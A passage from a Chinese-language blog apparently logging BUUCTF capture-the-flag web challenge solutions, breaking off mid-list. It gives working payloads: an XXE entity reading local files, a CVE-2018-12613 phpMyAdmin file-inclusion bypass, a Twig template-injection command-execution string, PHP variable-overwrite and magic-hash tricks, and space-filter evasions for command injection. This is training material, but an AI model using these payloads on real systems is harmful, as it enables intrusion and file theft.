<p>可以看出第一个变量的值就是<code>.</code>，使用<code>current()</code>函数获取第一个元素</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%查看当前目录</span><br>?exp=var<span class="hljs-built_in">_</span>dump(scandir(current(localeconv())))<br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747144310061.png" srcset="/img/loading.gif" lazyload alt="1747144310061"></p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%使用highlight_file()读取flag文件</span><br>这里控制数组的一些函数：<br>current()获取第一个元素<br>next()获取下一个元素<br>array<span class="hljs-built_in">_</span>reverse()翻转数组<br>?exp=highlight<span class="hljs-built_in">_</span>file(next(array<span class="hljs-built_in">_</span>reverse(scandir(current(localeconv())))));<br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747144619588.png" srcset="/img/loading.gif" lazyload alt="1747144619588"></p>
<h2 id="NCTF2019-Fake-XML-cookbook">[NCTF2019]Fake XML cookbook</h2>
<p>XML实体的类型及引用知识参考：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6483#toc-0">https://xz.aliyun.com/news/6483#toc-0</a></p>
<p>XXE漏洞原理：发生在应用程序解析XML输入时，<strong>没有禁止外部实体的加载</strong>，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。XXE漏洞触发的点往往是可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件。</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%xml语法</span><br>DOCTYPE（文档类型定义的声明）<br>ENTITY（实体的声明）<br>SYSTEM、PUBLIC（外部资源申请）<br>内部实体<br>&lt;!ENTITY 实体名称 &quot;实体值&quot;&gt;<br><br>外部实体<br>&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;<br></code></pre></td></tr></table></figure>
<ol>
<li>先抓包查看是否为xml实体注入：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747202652632.png" srcset="/img/loading.gif" lazyload alt="1747202652632"></p>
<ol start="2">
<li>有回显，尝试加载外部实体:</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%payload</span><br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE test[<br>	&lt;!ENTITY aim SYSTEM &quot;file:///flag&quot;&gt;<br>]&gt; <br>&lt;user&gt;&lt;username&gt;<span class="hljs-built_in">&amp;</span>aim;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747203345964.png" srcset="/img/loading.gif" lazyload alt="1747203345964"></p>
<h2 id="GWCTF-2019-我有一个数据库">[GWCTF 2019]我有一个数据库</h2>
<ol>
<li>使用dirsearch扫描发现敏感目录：<code>python dirsearch.py -u xxx(最后不能有/) -e * -w /xx(字典)</code></li>
</ol>
<p>发现敏感目录<code>/phpmyadmin</code>。</p>
<ol start="2">
<li>进入phpmyadmin页面，版本为<code>4.8.1</code>，存在<code>phpadmin 4.8.1远程文件包含漏洞（CVE-2018-12613）</code></li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747315989901.png" srcset="/img/loading.gif" lazyload alt="1747315989901"></p>
<ol start="3">
<li>文件包含漏洞原理：</li>
</ol>
<p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog">https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog</a></p>
<p>​			<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0d75017c154f">https://www.jianshu.com/p/0d75017c154f</a></p>
<p>漏洞入口： /index.php</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747316032547.png" srcset="/img/loading.gif" lazyload alt="1747316032547"></p>
<p>第57行限制 target 参数不能以index开头；第58行限制 target 参数不能出现在 $target_blacklist 内。</p>
<p>找到 $target_blacklist 的定义：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747316088811.png" srcset="/img/loading.gif" lazyload alt="1747316088811"></p>
<p>只要 target 参数不是 import.php 或 export.php 就行。</p>
<p>最后一个限制，找到checkPageValidity方法：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747316148916.png" srcset="/img/loading.gif" lazyload alt="1747316148916"></p>
<p>首先index.php调用checkPageValidity参数时并没有传第二个参数所以会进入此参数的第一个if区间，我们来看一下$goto_whilelist：<strong>定义了些可以被包含的文件名</strong></p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747316278080.png" srcset="/img/loading.gif" lazyload alt="1747316278080"></p>
<p>第二部分红色框部分：$_page为 以?分割然后取出前面的字符串再判断值是否存在与$goto_whilelist某个数组中。</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tex">后面又将<span class="hljs-built_in">$</span>page参数用urldecode解码再进行以?分割取出前面的值做判断。<br>如果传入target=db<span class="hljs-built_in">_</span>sql.php<span class="hljs-comment">%253f/../../../target.xxx</span><br>其中<span class="hljs-comment">%253f是?号的二次url编码</span><br>将<span class="hljs-built_in">$</span>page解码后是db<span class="hljs-built_in">_</span>sql.php?/../../test.php  再以?分割取出来前面的字符串为db<span class="hljs-built_in">_</span>sql.php，<span class="hljs-built_in">$</span>whitelist中有db<span class="hljs-built_in">_</span>sql.php所以会进入最后一个if区间return true，可以绕过valid函数<br>但最终访问到我们的target.xxx<br></code></pre></td></tr></table></figure>
<ol start="4">
<li>构造payload如下：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747316820721.png" srcset="/img/loading.gif" lazyload alt="1747316820721"></p>
<h2 id="BJDCTF2020-Mark-loves-cat">[BJDCTF2020]Mark loves cat</h2>
<ol>
<li>御剑扫描，访问<code>url/.git/</code>被禁止，存在源码泄露，命令如下:</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">python .<span class="hljs-keyword">\dirsearch</span>.py -e * -u url --timeout=2 -t 1 -x 400,403,404,500,503,429<br></code></pre></td></tr></table></figure>
<ol start="2">
<li>
<p>使用githack工具，命令为：<code>python githack.py url</code></p>
</li>
<li>
<p>阅读源码：</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$y</span>;<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>;<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br><br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure>
<p>代码解释：变量覆盖</p>
<p>第一个for:</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747624533252.png" srcset="/img/loading.gif" lazyload alt="1747624533252"></p>
<p>第二个for:</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747624565188.png" srcset="/img/loading.gif" lazyload alt="1747624565188"></p>
<ol start="4">
<li>思路</li>
</ol>
<p>思路一：</p>
<p>假设我们要绕过所有的if，必须传入get和post都传入flag=xx，跳过第二个if；同时xx不能是flag，满足第三个if；</p>
<p>如果仅仅传入flag，这里会导致原来的<code>$flag</code>在两个for循环时被覆盖，无法输出正确的flag值，我们的思路是先传入其他键名，暂存flag，但后续flag肯定要转回这个键名，绕不过第一个if。</p>
<p>思路二：转变思路，exit也可以输出，尝试进入if，并将对应的变量覆盖为flag</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%进入第一个if</span><br>/?handsome=flag<span class="hljs-built_in">&amp;</span>flag=handsome<br><br><span class="hljs-comment">%进入第二个if</span><br>/?yds=flag<br><br><span class="hljs-comment">%进入第三个if</span><br>/?flag=flag<span class="hljs-built_in">&amp;</span>is=flag<br></code></pre></td></tr></table></figure>
<h2 id="WUSTCTF2020-朴实无华">[WUSTCTF2020]朴实无华</h2>
<ol>
<li>
<p>扫目录，发现robots.txt，进入<code>/fAke_f1agggg.php</code>，抓包查看<code>fl4g.php</code>信息，访问<code>fl4g.php</code>查看源码。</p>
</li>
<li>
<p>源码如下：</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;鍘婚潪娲插惂&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;鍘婚潪娲插惂&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123;<br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;蹇埌闈炴床浜�&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;鍘婚潪娲插惂&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<ol start="3">
<li>level1:</li>
</ol>
<p>对intval()的利用</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%使用科学计数法</span><br>intval(1e9)=1<br>如果对1e9+1,里面的值会进行转换，变为正常的数字。<br></code></pre></td></tr></table></figure>
<ol start="4">
<li>level2:</li>
</ol>
<p>md5绕过</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%当比较设计字符串和数字时，字符串会转换为数字，</span><br><span class="hljs-comment">%如果字符串开头含数字，转换为该数字，不含则转换为0</span><br><span class="hljs-comment">%传入0e开头的数字，0e在比较的时候会将其视作为科学计数法的数字，所以无论0e后面是什么，0的多少次方还是0；</span><br><span class="hljs-comment">%并且该数字在md5后仍以0e开头</span><br>0e215962017<br>0e215962017<br></code></pre></td></tr></table></figure>
<ol start="5">
<li>get flag:</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%传入的值不能有空格:</span><br>1. 读文件**，用&lt;&gt;代替空格<br>2. 使用`<span class="hljs-built_in">$</span>&#123;IFS&#125;`或者`<span class="hljs-built_in">$</span>IFS<span class="hljs-built_in">$</span>9`来代替空格，bash下甚至可用&#123;cmd,args&#125;来代替空格<br>3. 控制字符代替空格（`<span class="hljs-comment">%09` `%0b` `%0c`） -&gt; 过滤 \x09</span><br><span class="hljs-comment">%cat会被替换:</span><br>使用tac替换<br></code></pre></td></tr></table></figure>
<h2 id="BJDCTF2020-Cookie-is-so-stable">[BJDCTF2020]Cookie is so stable</h2>
<ol>
<li>输入什么直接返回什么，有可能是ssti模板注入：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747710134723.png" srcset="/img/loading.gif" lazyload alt="1747710134723"></p>
<ol start="2">
<li>判断模版类型：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747710384408.png" srcset="/img/loading.gif" lazyload alt="1747710384408"></p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%尝试</span><br><span class="hljs-built_in">$</span>&#123;7*7&#125;，是否解析成功，进入分支<br><span class="hljs-comment">%尝试</span><br>a&#123;*comment*&#125;b,解析成功为Smarty<br><span class="hljs-comment">%尝试</span><br><span class="hljs-built_in">$</span>&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;,解析成功为Mako<br><span class="hljs-comment">%尝试</span><br><span class="hljs-built_in">$</span>&#123;7*7&#125;,返回49，<br>&#123;&#123;7<span class="hljs-keyword">\*</span>&#x27;7&#x27;&#125;&#125;,返回49,说明是Twig模板，但是如果返回7777777，则说明是Jinia2模板<br></code></pre></td></tr></table></figure>
<p>判断后为Twig模版。</p>
<ol start="3">
<li>Twig模版注入payload:</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">&#123;&#123;<span class="hljs-built_in">_</span>self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;<span class="hljs-built_in">_</span>self.env.getFilter(&quot;ls /&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure>
<p>其余模版参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#0X06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/#0X06-攻击思路</a></p>
<ol start="4">
<li>这里直接传入username=payload会被过滤，必须先设置一个正常的值，然后通过修改cookie值来实现模版注入。</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747711661627.png" srcset="/img/loading.gif" lazyload alt="1747711661627"></p>
<h2 id="MRCTF2020-Ezpop">[MRCTF2020]Ezpop</h2>
<ol>
<li>题目源码如下：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php">Welcome to index.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-comment">//WTF IS THIS?</span><br><span class="hljs-comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="hljs-comment">//And Crack It!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-comment">//类实例被当做函数名执行时</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<ol start="2">
